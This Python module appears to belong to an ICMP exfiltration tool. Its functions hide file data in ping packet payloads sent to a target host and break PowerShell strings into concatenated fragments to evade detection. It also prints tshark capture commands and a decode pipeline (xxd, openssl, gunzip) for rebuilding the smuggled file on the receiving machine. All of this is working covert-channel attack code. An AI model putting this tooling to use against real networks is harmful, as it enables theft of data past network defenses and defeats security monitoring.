import getpass
import random
import string
import subprocess
import sys

from .constants import TIMEOUT, color, STAR, STAR_v2, WARNING_STR


def ping(target, payload):
    cmd = ["ping", "-c", "1", "-W", str(TIMEOUT), "-s", str(len(payload)), "-p", payload.hex(), target]
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0


def format_time(seconds):
    minutes, seconds = divmod(int(seconds), 60)
    hours, minutes = divmod(minutes, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


def _ps_obfuscate(s, min_parts=3, max_parts=4):
    """Split a string into random parts and return a PS concatenation expression.
    e.g. 'IO.Compression.GzipStream' -> "'IO.Com'+'pression.Gzip'+'Stream'"
    """
    n = random.randint(min_parts, min(max_parts, len(s) - 1))
    cuts = sorted(random.sample(range(1, len(s)), n - 1))
    parts = []
    prev = 0
    for c in cuts:
        parts.append(s[prev:c])
        prev = c
    parts.append(s[prev:])
    return "+".join(f"'{p}'" for p in parts)


def _resolve_passphrase(args, confirm=False):
    """Resolve the encryption passphrase from flags or interactive prompt."""
    if args.enc_passphrase is not None:
        return args.enc_passphrase
    if args.random_passphrase is not None:
        charset = string.ascii_letters + string.digits + string.punctuation.replace("\\", "").replace("'", "")
        passphrase = ''.join(random.choices(charset, k=args.random_passphrase))
        print(f"{STAR} {color['GREEN']}Generated random passphrase: {color['CYAN']}{passphrase}{color['NC']}")
        return passphrase
    passphrase = getpass.getpass(f'{STAR} {color["GREEN"]}Enter encryption passphrase: {color["NC"]}')
    if confirm:
        passphrase_confirm = getpass.getpass(f'{STAR} {color["GREEN"]}Confirm passphrase: {color["NC"]}')
        if passphrase != passphrase_confirm:
            sys.exit(f"{WARNING_STR} {color['RED']}Passphrases do not match{color['NC']}")
    return passphrase


def _print_capture_instructions(args, passphrase, action_desc="pasting the payload"):
    if args.estimate_transfer_time:
        print(f"\n{WARNING_STR} {color['RED']}ESTIMATE OPTION ENABLED — the file will NOT be transferred{color['NC']}")
    else:
        print(f"\n{STAR_v2} {color['GREEN']}Remember to start {color['MAGENTA']}tshark{color['GREEN']} in your machine and capture packets before {action_desc} ({color['YELLOW']}adapt {color['GREEN']}"
              f"<network-interface>{color['YELLOW']} and {color['GREEN']}<IP-machine-containing-file>{color['GREEN']}):{color['NC']}\n")
        cap = args.capture_packets_filename
        out = args.decoded_filename
        print(f"{color['RED']}sudo tshark -i <network-interface> -l -Y 'icmp.type==8 && ip.src==<IP-machine-containing-file>' -T fields -e data.data > {cap}{color['NC']}")
        print(f"\n{STAR} {color['GREEN']}After capturing the packets, decode them with:{color['NC']}\n")
        decrypt = f" | openssl enc -d -{args.encrypt} -pbkdf2 -iter 10000 -md sha256 -pass pass:'{passphrase}'" if args.encrypt else ""
        decompress = " | gunzip" if args.compress else ""
        if args.junk:
            grep_pat = "'^ff'" if args.randomize_junk else "'^ffffff'"
            print(f"{color['RED']}LC_ALL=C sort -u {cap} | grep -v {grep_pat} | cut -c7- | xxd -r -p{decrypt}{decompress} > {out}{color['NC']}")
        else:
            print(f"{color['RED']}LC_ALL=C sort -u {cap} | cut -c7- | xxd -r -p{decrypt}{decompress} > {out}{color['NC']}")
        print(f"\n{STAR} {color['GREEN']}Verify SHA-256 hash for decoded file:{color['NC']}\n")
        print(f"{color['RED']}sha256sum {out}{color['NC']}")
